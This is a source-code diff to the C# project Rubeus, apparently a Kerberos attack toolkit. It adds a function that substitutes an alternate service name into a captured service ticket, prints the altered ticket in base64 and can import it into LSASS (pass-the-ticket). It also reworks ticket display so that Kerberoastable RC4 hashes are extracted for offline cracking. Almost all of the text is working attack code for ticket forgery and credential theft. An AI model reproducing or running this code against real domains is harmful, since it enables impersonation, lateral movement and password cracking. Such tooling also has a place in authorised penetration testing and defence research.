@@ -108,6 +108,52 @@ namespace Rubeus
             return luid;
         }
 
+        public static void SubstituteTGSSname(KRB_CRED kirbi, string altsname, bool ptt = false, Interop.LUID luid = new Interop.LUID())
+        {
+            // subtitutes in an alternate servicename (sname) into a supplied service ticket
+
+            Console.WriteLine("\r\n[*] Action: Service Ticket sname Substitution\r\n");
+
+            Console.WriteLine("[*] Substituting in alternate service name: {0}", altsname);
+
+            List<string> name_string = new List<string>();
+            string[] parts = altsname.Split('/');
+            if (parts.Length == 1)
+            {
+                // sname alone
+                kirbi.tickets[0].sname.name_string[0] = parts[0]; // ticket itself
+                kirbi.enc_part.ticket_info[0].sname.name_string[0] = parts[0]; // enc_part of the .kirbi
+            }
+            else if (parts.Length == 2)
+            {
+                name_string.Add(parts[0]);
+                name_string.Add(parts[1]);
+
+                kirbi.tickets[0].sname.name_string = name_string; // ticket itself
+                kirbi.enc_part.ticket_info[0].sname.name_string = name_string; // enc_part of the .kirbi
+            }
+
+            byte[] kirbiBytes = kirbi.Encode().Encode();
+
+            string kirbiString = Convert.ToBase64String(kirbiBytes);
+
+            Console.WriteLine("[*] base64(ticket.kirbi):\r\n", kirbiString);
+
+            // display the .kirbi base64, columns of 80 chararacters
+            foreach (string line in Helpers.Split(kirbiString, 80))
+            {
+                Console.WriteLine("      {0}", line);
+            }
+
+            DisplayTicket(kirbi, false);
+
+            if (ptt || ((ulong)luid != 0))
+            {
+                // pass-the-ticket -> import into LSASS
+                LSA.ImportTicket(kirbiBytes, luid);
+            }
+        }
+
         public static void ImportTicket(byte[] ticket, Interop.LUID targetLuid)
         {
             Console.WriteLine("\r\n[*] Action: Import Ticket");
@@ -1967,7 +2013,7 @@ namespace Rubeus
             }
         }
 
-        public static void DisplayTicket(KRB_CRED cred)
+        public static void DisplayTicket(KRB_CRED cred, bool extractKerberoastHash = false)
         {
             Console.WriteLine("\r\n[*] Action: Describe Ticket\r\n");
 
@@ -1993,10 +2039,19 @@ namespace Rubeus
             Console.WriteLine("  KeyType               :  {0}", keyType);
             Console.WriteLine("  Base64(key)           :  {0}", b64Key);
 
-            if (!Regex.IsMatch(sname, "^krbtgt.*", RegexOptions.IgnoreCase))
+            if (extractKerberoastHash && !Regex.IsMatch(sname, "^krbtgt.*", RegexOptions.IgnoreCase))
             {
-                // if this isn't a TGT, display a Kerberoastable hash
-                Roast.DisplayTGShash(cred);
+                // if this isn't a TGT, try to display a Kerberoastable hash
+                if (!keyType.Equals("rc4_hmac"))
+                {
+                    // can only display rc4_hmac as it doesn't have a salt. DES/AES keys require the user/domain as a salt,
+                    //      and we don't have the user account name that backs the requested SPN for the ticket, no no dice :(
+                    Console.WriteLine("\r\n[!] Service ticket uses encryption key type '{0}', unable to extract hash and salt.", keyType);
+                }
+                else
+                {
+                    Roast.DisplayTGShash(cred);
+                }
             }
 
             Console.WriteLine();
